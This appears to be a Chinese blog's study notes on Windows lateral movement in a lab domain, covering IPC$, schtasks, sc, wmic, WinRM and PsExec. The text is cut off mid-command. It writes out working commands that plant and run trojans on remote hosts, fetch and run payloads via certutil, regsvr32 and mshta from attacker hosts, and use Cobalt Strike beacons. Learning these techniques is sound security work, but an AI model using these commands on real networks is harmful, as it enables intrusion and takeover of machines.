src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202231624557.png" alt="image-20240202231624557"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233715534.png" alt="image-20240202233715534"></p><p>进行内网探测(端口扫描)</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202233825350.png" alt="image-20240202233825350"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234022906.png" alt="image-20240202234022906"></p><p>连着一块了</p><p>收集信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234342920.png" alt="image-20240202234342920"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202234404276.png" alt="image-20240202234404276"></p><p>然后达到获取其他主机的方式</p><p>但是在这之前必须了解一下smb</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">smbclient</span> //<span class="hljs-number">192.168.78.95</span>/C$ -U <span class="hljs-string">&#x27;web\administrator%1qaz<span class="hljs-variable">@WSX</span>&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240202235539483.png" alt="image-20240202235539483"></p><p>一个共享文件的方式</p><h1 id="内向工具篇"><a href="#内向工具篇" class="headerlink" title="内向工具篇"></a>内向工具篇</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><ol><li><p>简介</p><blockquote><p>IPC$ (Internet  Process Connection) 是共享 “命名管道” 的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p></blockquote></li><li><p>使用条件</p><ul><li><p>开放了139,445端口</p><blockquote><p>IPC$ 连接可以实现远程登陆及对默认共享的访问，而139端口的开启表示 netbios 协议的应用。  </p><p>我们可以通过139和445端口来实现对共享文件&#x2F;打印机的访问，因此一般来讲，IPC$连接是需要139或445端口来支持的。</p><p>IPC$ 连接默认会走445端口，不通的话则会走139端口，这两个端口都可以单独实现文件共享  </p></blockquote></li><li><p>目标开启IPC$文件共享服务及默认共享</p><blockquote><p>默认共享是为了方便管理员远程管理而默认开启的共享。  </p><p>所有逻辑磁盘（c$、d$、e$…）和系统目录 WINNT 或WINDOWS（ADMIN$） ，通过IPC连接可以实现对这些默认共享的访问</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203000036772.png" alt="image-20240203000036772"></p></li><li><p>需要目标机器的管理员账号和密码  （主要的）</p></li></ul><blockquote><p>  默认情况下只有被添加到远程计算机管理员组的域用户（域管用户）有权限对admin$ 目录建立 IPC 连接  </p><p>  本地的 Administrator 用户也可以，但是默认情况下该用户是被禁用的，如果启用了该用户，那么也可以使用 Administrator 用户远程连接</p></blockquote></li><li><p>常用的指令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>. 连接<br>net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\ipc<span class="hljs-variable">$</span> /user:administrator <span class="hljs-string">&quot;1qaz@wsx&quot;</span><br>上面的ipc<span class="hljs-variable">$</span>对应上面一幅图的ipc<span class="hljs-variable">$</span><br><br><span class="hljs-number">2</span>. 查看连接情况<br>net use<br><br><span class="hljs-number">3</span>. 查看目标主机时间<br>net time \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span><br><br><span class="hljs-number">4</span>. 删除连接<br>net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\ipc<span class="hljs-variable">$</span> /<span class="hljs-built_in">del</span><br>net use * /<span class="hljs-built_in">del</span> /y<br><br><span class="hljs-number">5</span>. 上传文件<br><span class="hljs-built_in">copy</span> shell.exe \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span>\windows\temp\plugin_update.exe<br><br><span class="hljs-number">6</span>. 下载文件<br><span class="hljs-built_in">copy</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span>\<span class="hljs-number">59</span>.exe c:\<br><br><span class="hljs-number">7</span>. 查看目标主机文件<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span><br><br><span class="hljs-number">8</span>. 开放/关闭 ipc<span class="hljs-variable">$</span> 共享。<br>net share ipc<span class="hljs-variable">$</span><br>net share ipc<span class="hljs-variable">$</span> /<span class="hljs-built_in">del</span><br><br><span class="hljs-number">9</span>. 共享计算机 C 盘。<br>net share C=c:\<br><br><span class="hljs-number">10</span>. 映射共享磁盘到本地<br>net use z: \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span>\c<span class="hljs-variable">$</span> /user:administrator <span class="hljs-string">&quot;1qaz@wsx&quot;</span><br><br><span class="hljs-number">11</span>. 查看/删除共享的资源。<br>net share<br>net share C /<span class="hljs-built_in">del</span><br><br><span class="hljs-number">12</span>. 取消IPC远程连接。<br>net use c: /<span class="hljs-built_in">del</span><br>net use * /<span class="hljs-built_in">del</span> /y<br><br><br></code></pre></td></tr></table></figure></li><li><p>IPC$连接失败常见错误号</p></li></ol>   <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">错误号</span> <span class="hljs-number">5</span><span class="hljs-string">，拒绝访问</span>                      <span class="hljs-string">【很可能你使用的用户不是管理员权限，先提升权限】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">51</span><span class="hljs-string">，Windows</span> <span class="hljs-string">无法找到网络路径</span>     <span class="hljs-string">【网络有问题】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">53</span><span class="hljs-string">，找不到网络路径</span>               <span class="hljs-string">【ip</span> <span class="hljs-string">地址错误；目标未开机；目标</span> <span class="hljs-string">lanmanserver</span> <span class="hljs-string">服务未启动；目标有防火墙（端口过滤）】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">67</span><span class="hljs-string">，找不到网络名</span>                 <span class="hljs-string">【你的</span> <span class="hljs-string">lanmanworkstation</span> <span class="hljs-string">服务未启动；目标删除了</span> <span class="hljs-string">ipc$；】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1219</span><span class="hljs-string">，提供的凭据与已存在的凭据集冲突</span>     <span class="hljs-string">【你已经和对方建立了一个ipc$，请删除后再连】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1326</span><span class="hljs-string">，未知的用户名或错误密码</span>             <span class="hljs-string">【用户名或密码错误】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1385</span><span class="hljs-string">，登录失败：未授予用户在此计算机上的请求登录类型</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">1792</span><span class="hljs-string">，试图登录，但是网络登录服务没有启动</span>     <span class="hljs-string">【目标NetLogon服务未启动[连接域控会出现此情况]】</span><br><span class="hljs-string">错误号</span> <span class="hljs-number">2242</span><span class="hljs-string">，此用户的密码已经过期</span>                   <span class="hljs-string">【目标有帐号策略，强制定期要求更改密码】</span><br></code></pre></td></tr></table></figure><h2 id="IPC-AT-Schtasks"><a href="#IPC-AT-Schtasks" class="headerlink" title="IPC+AT+Schtasks"></a>IPC+AT+Schtasks</h2><ol><li><p>at是什么</p><blockquote><p>  AT命令可在指定时间和日期、在指定计算机上运行命令和程序。  </p></blockquote><p>简单理解为可以当作定时任务</p></li><li><p>利用at</p><blockquote><p>net use \10.10.10.201\c$ &#x2F;user:administrator “1qaz@WSX3e”<br>copy 59.exe \10.10.10.201\c$<br>查看远程主机时间：net time \10.10.10.201<br>AT命令添加任务：at \10.10.10.201 19:08 c:\59.exe<br>AT命令删除任务：at \10.10.10.201 1 &#x2F;delete<br>AT命令查看任务：at \10.10.10.201</p><p>#查看at任务列表，已经执行了的，不会显示。</p></blockquote><p>注意</p><blockquote><p>  问题：执行at命令时，显示绑定句柄无效。  </p><p>  解决：echo 10.10.11.100 RemoteHost &gt;  C:\Windows\System32\drivers\etc\hosts  </p><p>  AT命令在windows server 2012等新版系统中已被弃用  </p><p>AT命令如果找不到网络路径，则判断是目标主机已禁用 Task Scheduler 服务</p></blockquote></li><li><p>Schtasks简介</p><p>  由于AT在windows server 2012等新版系统中已被弃用，所以需要使用 schtasks 命令代替。  </p><blockquote><p>  允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务  </p></blockquote><p>常用的指令</p><blockquote><p>&#x2F;Create     创建新计划任务。<br>&#x2F;Delete     删除计划任务。<br>&#x2F;Query      显示所有计划任务。<br>&#x2F;Change     更改计划任务属性。<br>&#x2F;Run        按需运行计划任务。<br>&#x2F;End        中止当前正在运行的计划任务。<br>&#x2F;ShowSid    显示与计划的任务名称相应的安全标识符。<br>&#x2F;?          显示此帮助消息。</p></blockquote><p>  更多请参考：<a href="https://blog.csdn.net/qq_39680564/article/details/88993633">https://blog.csdn.net/qq_39680564/article/details/88993633</a>  </p></li><li><p>横向移动</p><p>命令格式</p><blockquote><p>#创建任务<br>schtasks &#x2F;create &#x2F;tn(任务名字) task1 &#x2F;U 域\域用户 &#x2F;P 域用户密码 &#x2F;tr 命令 &#x2F;sc(计划类型) ONSTART &#x2F;s 域机器ip &#x2F;RU(启动用户) system<br>schtasks &#x2F;create &#x2F;S WIN-ENS2VR5TR3N &#x2F;TN “test” &#x2F;TR c:&#x2F;shell.exe &#x2F;SC MINUTE &#x2F;ST 21:27 &#x2F;ru system &#x2F;f</p><p>#运行任务<br>schtasks &#x2F;run &#x2F;tn task1 &#x2F;s 192.168.10.2 &#x2F;U 域&#x2F;域用户 &#x2F;P 域用户密码</p><p>#删除任务<br>schtasks &#x2F;F &#x2F;delete &#x2F;tn task1 &#x2F;s 域机器ip &#x2F;U 域\域用户 &#x2F;p 域用户密码</p></blockquote><blockquote><p>schtasks &#x2F;create             创建新的计划任务。<br>         &#x2F;sc schedule        指定计划类型。有效值为 MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY、ONCE、ONSTART、ONLOGON、ONIDLE。<br>         &#x2F;mo modifier        指定任务在其计划类型内的运行频率。这个参数对于 MONTHLY 计划是必需的。<br>                             对于 MINUTE、HOURLY、DAILY 或 WEEKLY 计划，这个参数有效，但也可选。默认值为 1。<br>         &#x2F;tr <TaskRun>       指定任务运行的程序或命令。如果忽略该路径，SchTasks.exe 将假定文件在 Systemroot\System32 目录下。<br>         &#x2F;tn <TaskName>      指定任务的名称。</p></blockquote><p>使用过程</p><p>创建连接</p><blockquote><p>net use \\10.10.10.201 &#x2F;user:administrator “1qaz@WSX34”<br>net use</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215439785.png" alt="image-20240203215439785"></p><p>上传木马（一般都是正向的payload）</p><blockquote><p>dir \10.10.10.201\c$<br>copy c:\windows\temp\59.exe \10.10.10.201\c$</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203215729364.png" alt="image-20240203215729364"></p><p>远程主机创建定时任务</p><blockquote><p>schtasks &#x2F;create &#x2F;s 10.10.10.201 &#x2F;u de1ay\administrator &#x2F;p “1qaz@WSX3e” &#x2F;sc MINUTE &#x2F;mo 1 &#x2F;tn test2 &#x2F;tr “c:\59.exe”</p></blockquote><p>  Schtasks运行远程主机上的计划任务  </p><blockquote><p>  schtasks &#x2F;run &#x2F;s 10.10.10.201  &#x2F;u de1ay\administrator &#x2F;p “1qaz@WSX3e” &#x2F;tn test2  </p></blockquote><p>  Schtasks删除远程主机上的计划任务  </p><blockquote><p>  schtasks &#x2F;delete &#x2F;tn At1 &#x2F;s 10.10.10.201  &#x2F;u administrator &#x2F;p 1qaz@WSX3e</p></blockquote></li></ol><h2 id="IPC-SC"><a href="#IPC-SC" class="headerlink" title="IPC+SC"></a>IPC+SC</h2><ol><li><p>sc简介</p><p>sc可以注册，删除，查询系统服务</p></li><li><p>sc远程注册服务</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#sc远程创建服务</span><br><span class="hljs-comment">#本地系统启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><br><span class="hljs-comment">#当 &quot;de1ay\administrator&quot; 用户登录时启动</span><br>sc <span class="hljs-string">\\10.10.10.201</span> create test(服务名) binpath= <span class="hljs-string">&quot;c:\59.exe&quot;</span> obj= <span class="hljs-string">&quot;de1ay\administrator&quot;</span> password= <span class="hljs-number">1qaz</span>@WSX3e<br><br><span class="hljs-comment">#sc启动指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> start test<br><br><span class="hljs-comment">#sc停止指定服务</span><br>sc <span class="hljs-string">\\10.10.10.201</span> stop test<br>sc <span class="hljs-string">\\10.10.10.201</span> <span class="hljs-keyword">delete</span> test<br></code></pre></td></tr></table></figure></li></ol><h2 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h2><blockquote><p>是用户管理本地和远程计算机的  一种模型。通过它可以访问、配置、管理和监视几乎所有的Windows资源。WMI的语法十分简单，基  本上常见的命名空间、对象等用几乎一模一样。它对应的是Windows里的WMI服务（winmgmt）。  </p><p>在 windows 2000之后的操作系统中内置了该服务。WMI使用公共信息模型（CIM）表示托管组件，其  中包括系统、应用程序、网络等等。CIM中使用类表示管理对象，命名空间是一个类的集合。  </p><p>通过使用135端口上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。</p><p>  而WMIC是为WMI提供的命令行界面。  </p></blockquote><ol><li><p>命令执行条件</p><ul><li>Windows Management Instrumentation 服务开启，端口TCP 135，默认开启</li><li>防火墙允许 135、445 等端口通信</li></ul></li><li><p>使用方法</p><ul><li><p>查询进程信息</p><blockquote><p>  wmic &#x2F;node:10.10.10.201  &#x2F;user:administrator &#x2F;password:1qaz@WSX3e process list brief  </p></blockquote></li><li><p>WMI不支持执行命令，但是支持执行文件，也就是说我们可以使用cmd.exe执行对应的程序</p><blockquote><p>  wmic &#x2F;node:10.10.10.201 &#x2F;<strong>user</strong>:administrator &#x2F;password:1qaz@WSX3e process  <strong>call</strong> <strong>create</strong> “cmd.exe &#x2F;c ipconfig”</p></blockquote></li><li><p>利用create创建进程</p><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203143455509.png" alt="image-20240203143455509"></p></li><li><p>远程执行</p><blockquote><p>  wmic &#x2F;node:10.10.10.201 &#x2F;<strong>user</strong>:administrator &#x2F;password:1qaz@WSX3e process  <strong>call</strong> <strong>create</strong> “cmd &#x2F;c calc.exe”</p></blockquote><p>如果出现User credentials cannot be used for local  connections,应该是调用calc.exe程序权限不够  的问题  </p><p> 如果出现Description &#x3D; 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断  WMI服务被禁用  </p><p>  wmic命令缺点是没有回显，可以使用wmiexec.vbs脚本实现回显。  也可以将输出重定向其他文件</p></li><li><p>下载并执行文件</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">wmic <span class="hljs-regexp">/node:10.10.10.201 /u</span>ser:administrator <span class="hljs-regexp">/password:1qaz@WSX3e process call create &quot;cmd /</span>c  certutil.exe -urlcache -split -f http:<span class="hljs-comment">//10.10.10.80/test.exe c:/windows/temp/test.exe &amp; c:/windows/temp/test.exe&quot;</span><br><br>wmic <span class="hljs-regexp">/node:10.10.10.201 /u</span>ser:administrator <span class="hljs-regexp">/password:1qaz@WSX3e process call create &quot;regsvr32 /</span>s <span class="hljs-regexp">/n /u</span> <span class="hljs-regexp">/i:http:/</span><span class="hljs-regexp">/192.168.78.117:8080/</span>feY7nzY.sct scrobj.dll<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><ol><li><p>简介</p><p>  WinRM 指的是Windows远程管理服务，通过远程连接winRM模块可以操作windows命令行，默认监听  端口5985（HTTP）和5986 (HTTPS)，在2012及以后默认开启。  </p></li><li><p>判断是否开启WinRM</p><p>  判断本机是否开启WinRM服务  </p><blockquote><p>winrm enumerate winrm&#x2F;config&#x2F;listener</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144625645.png" alt="image-20240203144625645"></p><blockquote><p>netstat -ano | findstr 5985  </p><p>wmic service list brief | findstr WinRM</p></blockquote></li><li><p>判断目标主机是否开启WinRM服务</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203144701302.png" alt="image-20240203144701302"></p><ol start="4"><li><p>开启</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">winrm quickconfig</span><br></code></pre></td></tr></table></figure></li><li><p>允许远程主机访问及访问远程主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;*&quot;</span>&#125;<br></code></pre></td></tr></table></figure></li><li><p>Winrs执行命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">winrs</span> -r:http://10.10.10.201:5985 -u:administrator -p:1qaz<span class="hljs-variable">@WSX3e</span> ipconfig<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">winrs</span> -r:http://10.10.10.201:5985 -u:administrator -p:1qaz<span class="hljs-variable">@WSX3e</span> <span class="hljs-string">&quot;cmd.exe&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>横向移动</p><ul><li><p>利用winrm参数选项中的invoke参数，来对目标对象执行特定的方法</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>create wmicimv2/win32_process @&#123;Commandline=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>命令调用了Windows WMI中Win32_process类的Create方法，生成了一个calc.exe的新进程</p></li><li><p>在远程机器上打开进程</p></li></ul>  <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>create wmicimv2/win32_process @&#123;Commandline=<span class="hljs-string">&quot;calc.exe&quot;</span>&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure><ul><li>在远程机器上创建服务</li></ul>  <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>Create wmicimv2/Win32_Service @&#123;Name=<span class="hljs-string">&quot;test&quot;</span>;DisplayName=<span class="hljs-string">&quot;test&quot;</span>;PathName=<span class="hljs-string">&quot;cmd.exe /k c:\59.exe&quot;</span>&#125; -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure><ul><li><p>在远程机器上启动服务  </p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">winrm<span class="hljs-built_in"> invoke </span>StartService wmicimv2/Win32_Service?Name=test -r:http://10.10.10.201:5985 -u:administrator -p:1qaz@WSX3e<br></code></pre></td></tr></table></figure></li></ul></li></ol><h1 id="外部工具篇"><a href="#外部工具篇" class="headerlink" title="外部工具篇"></a>外部工具篇</h1><h2 id="windwos工具简介"><a href="#windwos工具简介" class="headerlink" title="windwos工具简介"></a>windwos工具简介</h2><p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p><p>windwos tools 合集</p><h3 id="Procmon"><a href="#Procmon" class="headerlink" title="Procmon"></a>Procmon</h3><p>主要是使用用于监控软件，做了什么操作，比如，写入文件，查询了注册表等操作</p><h2 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h2><ol><li><p>简介</p><blockquote><p>  PsExec是一种轻巧的telnet替代品，可让您在其他系统上执行进程，并为控制台应用程序提供完整的  交互性，而无需手动安装客户端软件。  </p></blockquote></li><li><p>Psexec原理</p><ul><li><p>pc$连接,释放Psexesvc.exe  </p></li><li><p>通过服务管理OpenSCManager打开受害者机器上服务控制管理器的句柄  </p></li><li><p>通过CreateService创建服务  </p></li><li><p>获取服务句柄OpenService使用StartService启动服务</p></li></ul></li><li><p>使用的先天必要条件</p><ul><li>对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名</li><li>对方未开启防火墙</li><li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服  务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。  </li><li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用 户，连接域控只能用域管理员账户。</li></ul></li><li><p>PsExec.exe使用</p></li></ol><ul><li><p>直接只用</p><p>微软官方工具包 ，直接使用</p><p>第一次运行会弹框,输入 –accepteula 这个参数就可以绕过,  如果出现找不到网络名，判断目标主机已禁用ADMIN$共享    </p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">.<span class="hljs-string">\PsExec.exe</span> <span class="hljs-string">\\192.168.10.201</span> -u de1ay<span class="hljs-string">\Administrator</span> -p <span class="hljs-number">1qaz</span>@WSX3e -s cmd.exe -accepteula<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208093345962.png" alt="image-20240208093345962"></p><p>注意是使用的是官方的psTools 里面的东西</p><blockquote><p><a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p></blockquote></li><li><p>建立IPC连接，无需输入秘密</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">net use <span class="hljs-string">\\IP</span> /u:域名称<span class="hljs-string">\域账号</span> 密码<br><br>反弹cmd：<br>psexec.exe <span class="hljs-string">\\10.10.10.201</span> -s cmd.exe -accepteula<br><br>执行命令：<br>psexec.exe <span class="hljs-string">\\10.10.10.201</span> whoami -accepteula<br></code></pre></td></tr></table></figure><p>建立连接</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208094229727.png" alt="image-20240208094229727"></p><p>反弹shell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208094245871.png" alt="image-20240208094245871"></p><p>执行命令</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208094339360.png" alt="image-20240208094339360"></p><p>由于建立了连接，所以都不用在此输入密码</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">-c &lt;<span class="hljs-selector-attr">[路径]</span>文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）<br><br>-d 不等待程序执行完就返回<br><br>比如想上传一个本地的getpass到你远程连接的服务器上去:<br>Psexec<span class="hljs-selector-class">.exe</span> \\ip -u user -<span class="hljs-selector-tag">p</span> pass -c c:\getpass<span class="hljs-selector-class">.exe</span> –d<br></code></pre></td></tr></table></figure><p>个人觉得，下载文件的方式可能不太行，因为不太好做免杀</p></li><li><p>同理也可以使用工具合集里的psexec</p><p>其实是一样的</p></li><li><p>使用cs 执行文件</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">beacon&gt; shell psexec.exe <span class="hljs-string">\\10.10.10.201</span> -u de1ay<span class="hljs-string">\Administrator</span> -p <span class="hljs-number">1qaz</span>@WSX3e whoami<br>beacon&gt; shell psexec.exe <span class="hljs-string">\\10.10.10.201</span> -u de1ay<span class="hljs-string">\Administrator</span> -p <span class="hljs-number">1qaz</span>@WSX3e mshta http:<span class="hljs-regexp">//192.168.78.117:8088/download/file.ext</span><br></code></pre></td></tr></table></figure><p>简单地说，就是直接使用shell</p><p>前提就是需要有这个文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240208105838869.png" alt="image-20240208105838869"></p><p>但是cs 不能处理交互式的，所以只能以执行命令的方式进行</p></li><li><p>Psexec.py </p><p>impacket套件中的Psexec与官方psexec.exe相比会自动删除服务，增加隐蔽性  (新版本官方也会)</p><p>交互式命令行  </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">.\psexec<span class="hljs-selector-class">.exe</span> administrator<span class="hljs-selector-pseudo">:root</span><span class="hljs-keyword">@192</span>.168.79.135 